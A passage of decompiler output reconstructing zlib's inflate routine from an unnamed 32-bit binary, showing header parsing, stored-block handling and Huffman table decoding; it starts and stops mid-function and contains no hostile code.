  int v53; // eax
  int v54; // eax
  int v55; // eax
  int v56; // eax
  int v57; // eax
  int v58; // eax
  unsigned int v59; // eax
  int v60; // ecx
  int v61; // eax
  int v62; // eax
  char v63; // cl
  unsigned int v64; // ebx
  int v65; // ecx
  int v66; // eax
  int v67; // eax
  int v68; // eax
  size_t v69; // eax
  int v70; // eax
  int v71; // eax
  int v72; // ecx
  unsigned int v73; // ebx
  char v74; // al
  unsigned int v75; // eax
  int v76; // ecx
  bool v77; // cc
  int v78; // eax
  int v79; // eax
  int v80; // eax
  size_t v81; // ecx
  int v82; // eax
  int v83; // eax
  int v84; // eax
  int v85; // ecx
  size_t v86; // eax
  int v87; // ecx
  int v88; // eax
  int v89; // eax
  int v90; // eax
  int v91; // ecx
  __int16 v92; // cx
  int v93; // eax
  int v94; // ecx
  int v95; // eax
  int v96; // eax
  unsigned int v97; // ebx
  int v98; // eax
  int v99; // eax
  int v100; // eax
  unsigned int v101; // ebx
  int v102; // ecx
  unsigned int v103; // edx
  int v104; // ecx
  int v105; // eax
  size_t v106; // edx
  size_t v107; // eax
  bool v108; // zf
  int v109; // eax
  size_t v110; // eax
  int v111; // eax
  int v112; // eax
  int v113; // eax
  int v114; // ecx
  int v115; // eax
  unsigned int v116; // eax
  int v117; // eax
  int v118; // eax
  int v119; // ecx
  size_t v120; // eax
  int v121; // eax
  int v122; // eax
  int v123; // eax
  int v124; // ecx
  int v125; // eax
  unsigned int v126; // eax
  int v127; // eax
  int v128; // eax
  int v129; // ecx
  unsigned int v130; // eax
  size_t v131; // eax
  unsigned int v132; // ecx
  unsigned int v133; // eax
  int v134; // ecx
  int v135; // ecx
  _BYTE *v136; // ecx
  unsigned int v137; // ecx
  _BYTE *v138; // eax
  int v139; // ecx
  int v140; // eax
  int v141; // eax
  unsigned int v142; // eax
  unsigned int v143; // eax
  int v144; // eax
  int v145; // eax
  int v146; // eax
  int result; // eax
  size_t v148; // ecx
  size_t v149; // edx
  size_t v150; // ecx
  size_t v151; // edx
  size_t v153; // eax
  unsigned int v154; // ebx
  unsigned int v155; // eax
  int v156; // eax
  unsigned int v157; // [esp-14h] [ebp-48h]
  unsigned __int8 *v158; // [esp-10h] [ebp-44h]
  size_t v159; // [esp+4h] [ebp-30h]
  size_t v160; // [esp+4h] [ebp-30h]
  int v161; // [esp+8h] [ebp-2Ch]
  int v162; // [esp+8h] [ebp-2Ch]
  int v163; // [esp+8h] [ebp-2Ch]
  int v164; // [esp+8h] [ebp-2Ch]
  int i; // [esp+8h] [ebp-2Ch]
  int v166; // [esp+Ch] [ebp-28h]
  int v167; // [esp+10h] [ebp-24h]
  size_t v168; // [esp+10h] [ebp-24h]
  size_t v169; // [esp+10h] [ebp-24h]
  unsigned int v170; // [esp+10h] [ebp-24h]
  int v171; // [esp+14h] [ebp-20h]
  int v172; // [esp+18h] [ebp-1Ch]
  int v173; // [esp+18h] [ebp-1Ch]
  __int16 v174; // [esp+18h] [ebp-1Ch]
  _BYTE *v175; // [esp+1Ch] [ebp-18h]
  unsigned int v176; // [esp+20h] [ebp-14h] BYREF
  size_t v177; // [esp+24h] [ebp-10h]
  size_t Size; // [esp+28h] [ebp-Ch]
  void *Src; // [esp+2Ch] [ebp-8h]
  size_t v180; // [esp+30h] [ebp-4h]
  int v181; // [esp+3Ch] [ebp+8h]

  if ( !a3 )
    return -2;
  v4 = a3[7];
  if ( !v4 || !a3[3] || !*a3 && a3[1] )
    return -2;
  if ( *(_DWORD *)v4 == 11 )
    *(_DWORD *)v4 = 12;
  v5 = (unsigned __int8 *)*a3;
  v175 = (_BYTE *)a3[3];
  v6 = a3[4];
  v7 = *(_DWORD *)(v4 + 56);
  v180 = a3[1];
  v159 = v180;
  v8 = *(_DWORD *)v4;
  v9 = *(_DWORD *)(v4 + 60);
  v177 = v6;
  Src = v5;
  v171 = v6;
  v166 = 0;
  while ( 2 )
  {
    switch ( v8 )
    {
      case 0:
        if ( *(_DWORD *)(v4 + 8) )
        {
          if ( v9 < 0x10 )
          {
            while ( v180 )
            {
              v10 = *v5;
              --v180;
              v11 = v10 << v9;
              ++v5;
              v9 += 8;
              Src = v5;
              v7 += v11;
              if ( v9 >= 0x10 )
                goto LABEL_15;
            }
            goto LABEL_310;
          }
LABEL_15:
          if ( (*(_BYTE *)(v4 + 8) & 2) != 0 && v7 == 35615 )
          {
            *(_DWORD *)(v4 + 24) = sub_4030C0(0, 0, 0);
            LOWORD(v176) = -29921;
            v12 = sub_4030C0(*(_DWORD *)(v4 + 24), &v176, 2u);
            v5 = (unsigned __int8 *)Src;
            v7 = 0;
            *(_DWORD *)(v4 + 24) = v12;
            v9 = 0;
            *(_DWORD *)v4 = 1;
          }
          else
          {
            v13 = *(_DWORD *)(v4 + 32);
            *(_DWORD *)(v4 + 16) = 0;
            if ( v13 )
              *(_DWORD *)(v13 + 48) = -1;
            if ( (*(_BYTE *)(v4 + 8) & 1) == 0 || ((v7 >> 8) + ((unsigned __int8)v7 << 8)) % 0x1F )
            {
              a3[6] = (int)"incorrect header check";
              v5 = (unsigned __int8 *)Src;
              goto LABEL_301;
            }
            if ( (v7 & 0xF) != 8 )
            {
              v5 = (unsigned __int8 *)Src;
              a3[6] = (int)"unknown compression method";
              goto LABEL_301;
            }
            v14 = *(_DWORD *)(v4 + 36);
            v7 >>= 4;
            v9 -= 4;
            v15 = (v7 & 0xF) + 8;
            if ( v14 )
            {
              if ( v15 > v14 )
              {
                v5 = (unsigned __int8 *)Src;
                a3[6] = (int)"invalid window size";
                goto LABEL_301;
              }
            }
            else
            {
              *(_DWORD *)(v4 + 36) = v15;
            }
            *(_DWORD *)(v4 + 20) = 1 << v15;
            v16 = sub_405550(0, 0, 0);
            v5 = (unsigned __int8 *)Src;
            *(_DWORD *)(v4 + 24) = v16;
            a3[12] = v16;
            *(_DWORD *)v4 = ~BYTE1(v7) & 2 | 9;
            v7 = 0;
            v9 = 0;
          }
        }
        else
        {
          *(_DWORD *)v4 = 12;
        }
        goto LABEL_302;
      case 1:
        if ( v9 >= 0x10 )
          goto LABEL_33;
        do
        {
          if ( !v180 )
            goto LABEL_310;
          v17 = *v5;
          --v180;
          v18 = v17 << v9;
          ++v5;
          v9 += 8;
          Src = v5;
          v7 += v18;
        }
        while ( v9 < 0x10 );
LABEL_33:
        *(_DWORD *)(v4 + 16) = v7;
        if ( (_BYTE)v7 != 8 )
        {
          a3[6] = (int)"unknown compression method";
          goto LABEL_301;
        }
        if ( (v7 & 0xE000) != 0 )
        {
          a3[6] = (int)"unknown header flags set";
          goto LABEL_301;
        }
        v19 = *(int **)(v4 + 32);
        if ( v19 )
          *v19 = (v7 >> 8) & 1;
        if ( (*(_DWORD *)(v4 + 16) & 0x200) != 0 )
        {
          LOWORD(v176) = v7;
          v20 = sub_4030C0(*(_DWORD *)(v4 + 24), &v176, 2u);
          v5 = (unsigned __int8 *)Src;
          *(_DWORD *)(v4 + 24) = v20;
        }
        v7 = 0;
        v9 = 0;
        *(_DWORD *)v4 = 2;
        do
        {
LABEL_43:
          if ( !v180 )
            goto LABEL_310;
          v21 = *v5;
          --v180;
          v22 = v21 << v9;
          ++v5;
          v9 += 8;
          Src = v5;
          v7 += v22;
        }
        while ( v9 < 0x20 );
LABEL_45:
        v23 = *(_DWORD *)(v4 + 32);
        if ( v23 )
          *(_DWORD *)(v23 + 4) = v7;
        if ( (*(_DWORD *)(v4 + 16) & 0x200) != 0 )
        {
          v176 = v7;
          v24 = sub_4030C0(*(_DWORD *)(v4 + 24), &v176, 4u);
          v5 = (unsigned __int8 *)Src;
          *(_DWORD *)(v4 + 24) = v24;
        }
        v7 = 0;
        v9 = 0;
        *(_DWORD *)v4 = 3;
        do
        {
LABEL_51:
          if ( !v180 )
            goto LABEL_310;
          v25 = *v5;
          --v180;
          v26 = v25 << v9;
          ++v5;
          v9 += 8;
          Src = v5;
          v7 += v26;
        }
        while ( v9 < 0x10 );
LABEL_53:
        v27 = *(_DWORD *)(v4 + 32);
        if ( v27 )
        {
          *(_DWORD *)(v27 + 8) = (unsigned __int8)v7;
          *(_DWORD *)(*(_DWORD *)(v4 + 32) + 12) = v7 >> 8;
        }
        if ( (*(_DWORD *)(v4 + 16) & 0x200) != 0 )
        {
          LOWORD(v176) = v7;
          v28 = sub_4030C0(*(_DWORD *)(v4 + 24), &v176, 2u);
          v5 = (unsigned __int8 *)Src;
          *(_DWORD *)(v4 + 24) = v28;
        }
        v7 = 0;
        v9 = 0;
        *(_DWORD *)v4 = 4;
LABEL_58:
        if ( (*(_DWORD *)(v4 + 16) & 0x400) != 0 )
        {
          if ( v9 < 0x10 )
          {
            while ( v180 )
            {
              v29 = *v5;
              --v180;
              v30 = v29 << v9;
              ++v5;
              v9 += 8;
              Src = v5;
              v7 += v30;
              if ( v9 >= 0x10 )
                goto LABEL_62;
            }
            goto LABEL_310;
          }
LABEL_62:
          v31 = *(_DWORD *)(v4 + 32);
          *(_DWORD *)(v4 + 64) = v7;
          if ( v31 )
            *(_DWORD *)(v31 + 20) = v7;
          if ( (*(_DWORD *)(v4 + 16) & 0x200) != 0 )
          {
            LOWORD(v176) = v7;
            v32 = sub_4030C0(*(_DWORD *)(v4 + 24), &v176, 2u);
            v5 = (unsigned __int8 *)Src;
            *(_DWORD *)(v4 + 24) = v32;
          }
          v7 = 0;
          v9 = 0;
        }
        else
        {
          v33 = *(_DWORD *)(v4 + 32);
          if ( v33 )
            *(_DWORD *)(v33 + 16) = 0;
        }
        *(_DWORD *)v4 = 5;
LABEL_70:
        if ( (*(_DWORD *)(v4 + 16) & 0x400) != 0 )
        {
          v34 = *(_DWORD *)(v4 + 64);
          Size = v34;
          if ( v34 > v180 )
          {
            v34 = v180;
            Size = v180;
          }
          if ( v34 )
          {
            v35 = *(_DWORD *)(v4 + 32);
            if ( v35 )
            {
              v161 = *(_DWORD *)(v35 + 16);
              if ( v161 )
              {
                v36 = *(_DWORD *)(v4 + 32);
                v37 = *(_DWORD *)(v36 + 20) - *(_DWORD *)(v4 + 64);
                v38 = *(_DWORD *)(v36 + 24);
                if ( v34 + v37 > v38 )
                  v34 = v38 - v37;
                memmove_0((void *)(v37 + v161), Src, v34);
                v34 = Size;
                v5 = (unsigned __int8 *)Src;
              }
            }
            if ( (*(_DWORD *)(v4 + 16) & 0x200) != 0 )
            {
              v39 = sub_4030C0(*(_DWORD *)(v4 + 24), Src, Size);
              v5 = (unsigned __int8 *)Src;
              *(_DWORD *)(v4 + 24) = v39;
              v34 = Size;
            }
            v180 -= v34;
            v5 += v34;
            *(_DWORD *)(v4 + 64) -= v34;
            Src = v5;
          }
          if ( *(_DWORD *)(v4 + 64) )
            goto LABEL_310;
        }
        *(_DWORD *)(v4 + 64) = 0;
        *(_DWORD *)v4 = 6;
LABEL_84:
        if ( (*(_DWORD *)(v4 + 16) & 0x800) != 0 )
        {
          if ( !v180 )
            goto LABEL_310;
          v40 = 0;
          do
          {
            v41 = v5[v40];
            Size = v40 + 1;
            v42 = *(_DWORD *)(v4 + 32);
            v172 = v41;
            if ( v42 )
            {
              v162 = *(_DWORD *)(v42 + 28);
              if ( v162 )
              {
                v43 = *(_DWORD *)(v4 + 64);
                if ( v43 < *(_DWORD *)(v42 + 32) )
                {
                  *(_BYTE *)(v162 + v43) = v172;
                  ++*(_DWORD *)(v4 + 64);
                  v5 = (unsigned __int8 *)Src;
                }
              }
            }
            if ( !v172 )
              break;
            v40 = Size;
          }
          while ( Size < v180 );
          if ( (*(_DWORD *)(v4 + 16) & 0x200) != 0 )
          {
            v44 = sub_4030C0(*(_DWORD *)(v4 + 24), Src, Size);
            v5 = (unsigned __int8 *)Src;
            *(_DWORD *)(v4 + 24) = v44;
          }
          v180 -= Size;
          v5 += Size;
          Src = v5;
          if ( v172 )
            goto LABEL_310;
        }
        else
        {
          v45 = *(_DWORD *)(v4 + 32);
          if ( v45 )
            *(_DWORD *)(v45 + 28) = 0;
        }
        *(_DWORD *)(v4 + 64) = 0;
        *(_DWORD *)v4 = 7;
LABEL_100:
        if ( (*(_DWORD *)(v4 + 16) & 0x1000) != 0 )
        {
          if ( !v180 )
            goto LABEL_310;
          v46 = 0;
          do
          {
            v47 = v5[v46];
            Size = v46 + 1;
            v48 = *(_DWORD *)(v4 + 32);
            v173 = v47;
            if ( v48 )
            {
              v163 = *(_DWORD *)(v48 + 36);
              if ( v163 )
              {
                v49 = *(_DWORD *)(v4 + 64);
                if ( v49 < *(_DWORD *)(v48 + 40) )
                {
                  *(_BYTE *)(v163 + v49) = v173;
                  ++*(_DWORD *)(v4 + 64);
                  v5 = (unsigned __int8 *)Src;
                }
              }
            }
            if ( !v173 )
              break;
            v46 = Size;
          }
          while ( Size < v180 );
          if ( (*(_DWORD *)(v4 + 16) & 0x200) != 0 )
          {
            v50 = sub_4030C0(*(_DWORD *)(v4 + 24), Src, Size);
            v5 = (unsigned __int8 *)Src;
            *(_DWORD *)(v4 + 24) = v50;
          }
          v180 -= Size;
          v5 += Size;
          Src = v5;
          if ( v173 )
            goto LABEL_310;
        }
        else
        {
          v51 = *(_DWORD *)(v4 + 32);
          if ( v51 )
            *(_DWORD *)(v51 + 36) = 0;
        }
        *(_DWORD *)v4 = 8;
LABEL_116:
        if ( (*(_DWORD *)(v4 + 16) & 0x200) != 0 )
        {
          if ( v9 < 0x10 )
          {
            while ( v180 )
            {
              v52 = *v5;
              --v180;
              v53 = v52 << v9;
              ++v5;
              v9 += 8;
              Src = v5;
              v7 += v53;
              if ( v9 >= 0x10 )
                goto LABEL_120;
            }
            goto LABEL_310;
          }
LABEL_120:
          if ( v7 != *(unsigned __int16 *)(v4 + 24) )
          {
            a3[6] = (int)"header crc mismatch";
            goto LABEL_301;
          }
          v7 = 0;
          v9 = 0;
        }
        v54 = *(_DWORD *)(v4 + 32);
        if ( v54 )
        {
          *(_DWORD *)(v54 + 44) = (*(int *)(v4 + 16) >> 9) & 1;
          *(_DWORD *)(*(_DWORD *)(v4 + 32) + 48) = 1;
        }
        v55 = sub_4030C0(0, 0, 0);
        v5 = (unsigned __int8 *)Src;
        *(_DWORD *)(v4 + 24) = v55;
        a3[12] = v55;
        *(_DWORD *)v4 = 11;
        goto LABEL_302;
      case 2:
        if ( v9 < 0x20 )
          goto LABEL_43;
        goto LABEL_45;
      case 3:
        if ( v9 < 0x10 )
          goto LABEL_51;
        goto LABEL_53;
      case 4:
        goto LABEL_58;
      case 5:
        goto LABEL_70;
      case 6:
        goto LABEL_84;
      case 7:
        goto LABEL_100;
      case 8:
        goto LABEL_116;
      case 9:
        if ( v9 >= 0x20 )
          goto LABEL_129;
        do
        {
          if ( !v180 )
            goto LABEL_310;
          v56 = *v5;
          --v180;
          v57 = v56 << v9;
          ++v5;
          v9 += 8;
          Src = v5;
          v7 += v57;
        }
        while ( v9 < 0x20 );
LABEL_129:
        v58 = HIBYTE(v7) + (((v7 << 16) + (v7 & 0xFF00)) << 8) + ((v7 >> 8) & 0xFF00);
        *(_DWORD *)(v4 + 24) = v58;
        a3[12] = v58;
        v7 = 0;
        v9 = 0;
        *(_DWORD *)v4 = 10;
LABEL_130:
        if ( !*(_DWORD *)(v4 + 12) )
        {
          a3[3] = (int)v175;
          v148 = v177;
          *a3 = (int)v5;
          v149 = v180;
          a3[4] = v148;
          a3[1] = v149;
          *(_DWORD *)(v4 + 60) = v9;
          *(_DWORD *)(v4 + 56) = v7;
          return 2;
        }
        v59 = sub_405550(0, 0, 0);
        *(_DWORD *)(v4 + 24) = v59;
        a3[12] = v59;
        v5 = (unsigned __int8 *)Src;
        *(_DWORD *)v4 = 11;
LABEL_132:
        if ( a4 == 5 || a4 == 6 )
          goto LABEL_310;
LABEL_134:
        if ( !*(_DWORD *)(v4 + 4) )
        {
          if ( v9 >= 3 )
          {
LABEL_139:
            v63 = v7;
            v64 = v7 >> 1;
            *(_DWORD *)(v4 + 4) = v63 & 1;
            switch ( v64 & 3 )
            {
              case 0u:
                v7 = v64 >> 2;
                *(_DWORD *)v4 = 13;
                v9 -= 3;
                goto LABEL_302;
              case 1u:
                sub_4032E0((_DWORD *)v4);
                *(_DWORD *)v4 = 19;
                if ( a4 != 6 )
                  goto LABEL_145;
                v7 = v64 >> 2;
                v9 -= 3;
                goto LABEL_310;
              case 2u:
                v7 = v64 >> 2;
                *(_DWORD *)v4 = 16;
                v9 -= 3;
                goto LABEL_302;
              case 3u:
                a3[6] = (int)"invalid block type";
                *(_DWORD *)v4 = 29;
                goto LABEL_145;
              default:
LABEL_145:
                v7 = v64 >> 2;
                v9 -= 3;
                goto LABEL_302;
            }
          }
          while ( v180 )
          {
            v61 = *v5;
            --v180;
            v62 = v61 << v9;
            ++v5;
            v9 += 8;
            Src = v5;
            v7 += v62;
            if ( v9 >= 3 )
              goto LABEL_139;
          }
          goto LABEL_310;
        }
        v60 = v9 & 7;
        v7 >>= v60;
        v9 -= v60;
        *(_DWORD *)v4 = 26;
        goto LABEL_302;
      case 10:
        goto LABEL_130;
      case 11:
        goto LABEL_132;
      case 12:
        goto LABEL_134;
      case 13:
        v65 = v9 & 7;
        v9 -= v65;
        v7 >>= v65;
        if ( v9 >= 0x20 )
          goto LABEL_149;
        do
        {
          if ( !v180 )
            goto LABEL_310;
          v66 = *v5;
          --v180;
          v67 = v66 << v9;
          ++v5;
          v9 += 8;
          Src = v5;
          v7 += v67;
        }
        while ( v9 < 0x20 );
LABEL_149:
        v68 = (unsigned __int16)v7;
        if ( (unsigned __int16)v7 != ~v7 >> 16 )
        {
          a3[6] = (int)"invalid stored block lengths";
          goto LABEL_301;
        }
        v7 = 0;
        v9 = 0;
        *(_DWORD *)(v4 + 64) = v68;
        *(_DWORD *)v4 = 14;
        if ( a4 == 6 )
          goto LABEL_310;
LABEL_152:
        *(_DWORD *)v4 = 15;
LABEL_153:
        v69 = *(_DWORD *)(v4 + 64);
        Size = v69;
        if ( !v69 )
          goto LABEL_231;
        if ( v69 > v180 )
        {
          v69 = v180;
          Size = v180;
        }
        if ( v69 > v177 )
        {
          v69 = v177;
          Size = v177;
        }
        if ( !v69 )
          goto LABEL_310;
        memmove_0(v175, Src, Size);
        Src = (char *)Src + Size;
        v180 -= Size;
        v177 -= Size;
        v175 += Size;
        v5 = (unsigned __int8 *)Src;
        *(_DWORD *)(v4 + 64) -= Size;
        goto LABEL_302;
      case 14:
        goto LABEL_152;
      case 15:
        goto LABEL_153;
      case 16:
        if ( v9 >= 0xE )
          goto LABEL_163;
        do
        {
          if ( !v180 )
            goto LABEL_310;
          v70 = *v5;
          --v180;
          v71 = v70 << v9;
          ++v5;
          v9 += 8;
          Src = v5;
          v7 += v71;
        }
        while ( v9 < 0xE );
LABEL_163:
        v72 = v7 & 0x1F;
        v73 = v7 >> 5;
        v74 = v73;
        *(_DWORD *)(v4 + 96) = v72 + 257;
        v73 >>= 5;
        v75 = (v74 & 0x1F) + 1;
        v76 = (v73 & 0xF) + 4;
        v7 = v73 >> 4;
        v9 -= 14;
        v77 = *(_DWORD *)(v4 + 96) <= 0x11Eu;
        *(_DWORD *)(v4 + 100) = v75;
        *(_DWORD *)(v4 + 92) = v76;
        if ( !v77 || v75 > 0x1E )
        {
          a3[6] = (int)"too many length or distance symbols";
          goto LABEL_301;
        }
        *(_DWORD *)(v4 + 104) = 0;
        *(_DWORD *)v4 = 17;
LABEL_166:
        if ( *(_DWORD *)(v4 + 104) < *(_DWORD *)(v4 + 92) )
        {
          while ( v9 >= 3 )
          {
LABEL_170:
            *(_WORD *)(v4 + 2 * (unsigned __int16)word_432688[(*(_DWORD *)(v4 + 104))++] + 112) = v7 & 7;
            v7 >>= 3;
            v9 -= 3;
            if ( *(_DWORD *)(v4 + 104) >= *(_DWORD *)(v4 + 92) )
              goto LABEL_171;
          }
          while ( v180 )
          {
            v78 = *v5;
            --v180;
            v79 = v78 << v9;
            ++v5;
            v9 += 8;
            Src = v5;
            v7 += v79;
            if ( v9 >= 3 )
              goto LABEL_170;
          }
          goto LABEL_310;
        }
LABEL_171:
        while ( *(_DWORD *)(v4 + 104) < 0x13u )
          *(_WORD *)(v4 + 2 * (unsigned __int16)word_432688[(*(_DWORD *)(v4 + 104))++] + 112) = 0;
        *(_DWORD *)(v4 + 108) = v4 + 1328;
        *(_DWORD *)(v4 + 76) = v4 + 1328;
        *(_DWORD *)(v4 + 84) = 7;
        v80 = sub_405160(0, v4 + 112, 0x13u, (_DWORD **)(v4 + 108), (unsigned int *)(v4 + 84), (char *)(v4 + 752));
        v5 = (unsigned __int8 *)Src;
        v166 = v80;
        if ( v80 )
        {
          a3[6] = (int)"invalid code lengths set";
          goto LABEL_301;
        }
        *(_DWORD *)(v4 + 104) = 0;
        *(_DWORD *)v4 = 18;
LABEL_177:
        if ( *(_DWORD *)(v4 + 104) < (unsigned int)(*(_DWORD *)(v4 + 96) + *(_DWORD *)(v4 + 100)) )
        {
          while ( 1 )
          {
            v81 = *(_DWORD *)(*(_DWORD *)(v4 + 76) + 4 * (v7 & ((1 << *(_DWORD *)(v4 + 84)) - 1)));
            Size = v81;
            if ( BYTE1(v81) > v9 )
              break;
LABEL_181:
            v86 = HIWORD(v81);
            if ( HIWORD(v81) >= 0x10u )
            {
              if ( HIWORD(v81) == 16 )
              {
                if ( v9 < (unsigned int)BYTE1(v81) + 2 )
                {
                  while ( v180 )
                  {
                    v88 = *v5;
                    --v180;
                    v89 = v88 << v9;
                    BYTE1(v81) = BYTE1(Size);
                    ++v5;
                    v9 += 8;
                    v7 += v89;
                    Src = v5;
                    if ( v9 >= (unsigned int)BYTE1(Size) + 2 )
                      goto LABEL_187;
                  }
                  goto LABEL_310;
                }
LABEL_187:
                v90 = *(_DWORD *)(v4 + 104);
                v91 = BYTE1(v81);
                v7 >>= v91;
                v9 -= v91;
                if ( !v90 )
                {
                  a3[6] = (int)"invalid bit length repeat";
                  goto LABEL_301;
                }
                v92 = *(_WORD *)(v4 + 2 * v90 + 110);
                v93 = (v7 & 3) + 3;
                v7 >>= 2;
                v174 = v92;
                Size = v93;
                v9 -= 2;
              }
              else
              {
                v94 = BYTE1(v81);
                v167 = v94;
                if ( HIWORD(Size) == 17 )
                {
                  if ( v9 < v94 + 3 )
                  {
                    while ( v180 )
                    {
                      v95 = *v5;
                      --v180;
                      v96 = v95 << v9;
                      v94 = v167;
                      ++v5;
                      v9 += 8;
                      v7 += v96;
                      Src = v5;
                      if ( v9 >= v167 + 3 )
                        goto LABEL_193;
                    }
                    goto LABEL_310;
                  }
LABEL_193:
                  v97 = v7 >> v94;
                  Size = (v97 & 7) + 3;
                  v7 = v97 >> 3;
                  v98 = -3;
                }
                else
                {
                  if ( v9 < v94 + 7 )
                  {
                    while ( v180 )
                    {
                      v99 = *v5;
                      --v180;
                      v100 = v99 << v9;
                      v94 = v167;
                      ++v5;
                      v9 += 8;
                      v7 += v100;
                      Src = v5;
                      if ( v9 >= v167 + 7 )
                        goto LABEL_197;
                    }
                    goto LABEL_310;
                  }
LABEL_197:
                  v101 = v7 >> v94;
                  Size = (v101 & 0x7F) + 11;
                  v7 = v101 >> 7;
                  v98 = -7;
                }
                v9 += v98 - v94;
                v93 = Size;
                v174 = 0;
              }
              if ( v93 + *(_DWORD *)(v4 + 104) > (unsigned int)(*(_DWORD *)(v4 + 96) + *(_DWORD *)(v4 + 100)) )
              {
                a3[6] = (int)"invalid bit length repeat";
                goto LABEL_301;
              }
              for ( ; Size; ++*(_DWORD *)(v4 + 104) )
              {
                v102 = *(_DWORD *)(v4 + 104);
                --Size;
                *(_WORD *)(v4 + 2 * v102 + 112) = v174;
              }
            }
            else
            {
              v87 = BYTE1(v81);
              v7 >>= v87;
              v9 -= v87;
              *(_WORD *)(v4 + 2 * (*(_DWORD *)(v4 + 104))++ + 112) = v86;
            }
            if ( *(_DWORD *)(v4 + 104) >= (unsigned int)(*(_DWORD *)(v4 + 96) + *(_DWORD *)(v4 + 100)) )
              goto LABEL_203;
          }
          while ( v180 )
          {
            v82 = *v5;
            --v180;
            v83 = v82 << v9;
            ++v5;
            v9 += 8;
            v7 += v83;
            v84 = 1 << *(_DWORD *)(v4 + 84);
            v85 = *(_DWORD *)(v4 + 76);
            Src = v5;
            v81 = *(_DWORD *)(v85 + 4 * (v7 & (v84 - 1)));
            Size = v81;
            if ( BYTE1(v81) <= v9 )
              goto LABEL_181;
          }
          goto LABEL_310;
        }
LABEL_203:
        if ( *(_DWORD *)v4 == 29 )
          goto LABEL_302;
        if ( !*(_WORD *)(v4 + 624) )
        {
          a3[6] = (int)"invalid code -- missing end-of-block";
          goto LABEL_301;
        }
        *(_DWORD *)(v4 + 108) = v4 + 1328;
        *(_DWORD *)(v4 + 76) = v4 + 1328;
        v103 = *(_DWORD *)(v4 + 96);
        *(_DWORD *)(v4 + 84) = 9;
        v166 = sub_405160(1, v4 + 112, v103, (_DWORD **)(v4 + 108), (unsigned int *)(v4 + 84), (char *)(v4 + 752));
        if ( v166 )
        {
          v5 = (unsigned __int8 *)Src;
          a3[6] = (int)"invalid literal/lengths set";
          goto LABEL_301;
        }
        *(_DWORD *)(v4 + 80) = *(_DWORD *)(v4 + 108);
        v104 = *(_DWORD *)(v4 + 96);
        *(_DWORD *)(v4 + 88) = 6;
        v105 = sub_405160(
                 2,
                 v4 + 2 * v104 + 112,
                 *(_DWORD *)(v4 + 100),
                 (_DWORD **)(v4 + 108),
                 (unsigned int *)(v4 + 88),
                 (char *)(v4 + 752));
        v5 = (unsigned __int8 *)Src;
        v166 = v105;
        if ( v105 )
        {
          a3[6] = (int)"invalid distances set";
          goto LABEL_301;
        }
        *(_DWORD *)v4 = 19;
        if ( a4 == 6 )
          goto LABEL_310;
LABEL_213:
        *(_DWORD *)v4 = 20;
LABEL_214:
        if ( v180 >= 6 && v177 >= 0x102 )
        {
          v106 = v177;
          a3[3] = (int)v175;
          *a3 = (int)Src;
          a3[4] = v106;
          a3[1] = v180;
          *(_DWORD *)(v4 + 56) = v7;
          *(_DWORD *)(v4 + 60) = v9;
          sub_404AC0(a1, a2, a3, v171);
          v7 = *(_DWORD *)(v4 + 56);
          v9 = *(_DWORD *)(v4 + 60);
          v175 = (_BYTE *)a3[3];
          v5 = (unsigned __int8 *)*a3;
          v107 = a3[1];
          v108 = *(_DWORD *)v4 == 11;
          v177 = a3[4];
          Src = v5;
          v180 = v107;
          if ( v108 )
            *(_DWORD *)(v4 + 7108) = -1;
          goto LABEL_302;
        }
        v109 = 1 << *(_DWORD *)(v4 + 84);
        *(_DWORD *)(v4 + 7108) = 0;
        v110 = *(_DWORD *)(*(_DWORD *)(v4 + 76) + 4 * (v7 & (v109 - 1)));
        Size = v110;
        if ( BYTE1(v110) > v9 )
        {
          while ( v180 )
          {
            v111 = *v5;
            --v180;
            v112 = v111 << v9;
            ++v5;
            v9 += 8;
            v7 += v112;
            v113 = 1 << *(_DWORD *)(v4 + 84);
            v114 = *(_DWORD *)(v4 + 76);
            Src = v5;
            v110 = *(_DWORD *)(v114 + 4 * (v7 & (v113 - 1)));
            Size = v110;
            if ( BYTE1(v110) <= v9 )
              goto LABEL_221;
          }
          goto LABEL_310;
        }
LABEL_221:
        if ( (_BYTE)v110 && (v110 & 0xF0) == 0 )
        {
          v168 = v110;
          Size = *(_DWORD *)(*(_DWORD *)(v4 + 76)
                           + 4 * (HIWORD(Size) + ((v7 & ((1 << (BYTE1(v110) + v110)) - 1)) >> SBYTE1(v110))));
          if ( BYTE1(v110) + (unsigned int)BYTE1(Size) > v9 )
          {
            while ( v180 )
            {
              v115 = *v5 << v9;
              --v180;
              ++v5;
              v7 += v115;
              v9 += 8;
              Src = v5;
              Size = *(_DWORD *)(*(_DWORD *)(v4 + 76)
                               + 4 * (HIWORD(v168) + ((v7 & ((1 << (BYTE1(v168) + v168)) - 1)) >> SBYTE1(v168))));
              if ( BYTE1(v168) + (unsigned int)BYTE1(Size) <= v9 )
                goto LABEL_226;
            }
            goto LABEL_310;
          }
LABEL_226:
          v110 = Size;
          v7 >>= SBYTE1(v168);
          v9 -= BYTE1(v168);
          *(_DWORD *)(v4 + 7108) = BYTE1(v168);
        }
        *(_DWORD *)(v4 + 7108) += BYTE1(v110);
        v7 >>= SBYTE1(v110);
        v9 -= BYTE1(v110);
        *(_DWORD *)(v4 + 64) = HIWORD(v110);
        if ( !(_BYTE)v110 )
        {
          *(_DWORD *)v4 = 25;
          goto LABEL_302;
        }
        if ( (v110 & 0x20) == 0 )
        {
          if ( (v110 & 0x40) != 0 )
          {
            a3[6] = (int)"invalid literal/length code";
            goto LABEL_301;
          }
          *(_DWORD *)(v4 + 72) = v110 & 0xF;
          *(_DWORD *)v4 = 21;
LABEL_235:
          v116 = *(_DWORD *)(v4 + 72);
          if ( v116 )
          {
            if ( v9 < v116 )
            {
              while ( v180 )
              {
                v117 = *v5;
                --v180;
                v118 = v117 << v9;
                ++v5;
                v9 += 8;
                Src = v5;
                v7 += v118;
                if ( v9 >= *(_DWORD *)(v4 + 72) )
                  goto LABEL_239;
              }
              goto LABEL_310;
            }
LABEL_239:
            v119 = *(_DWORD *)(v4 + 72);
            v9 -= v119;
            *(_DWORD *)(v4 + 64) += v7 & ((1 << v119) - 1);
            v7 >>= v119;
            *(_DWORD *)(v4 + 7108) += v119;
          }
          *(_DWORD *)(v4 + 7112) = *(_DWORD *)(v4 + 64);
          *(_DWORD *)v4 = 22;
LABEL_241:
          v120 = *(_DWORD *)(*(_DWORD *)(v4 + 80) + 4 * (v7 & ((1 << *(_DWORD *)(v4 + 88)) - 1)));
          Size = v120;
          if ( BYTE1(v120) > v9 )
          {
            while ( v180 )
            {
              v121 = *v5;
              --v180;
              v122 = v121 << v9;
              ++v5;
              v9 += 8;
              v7 += v122;
              v123 = 1 << *(_DWORD *)(v4 + 88);
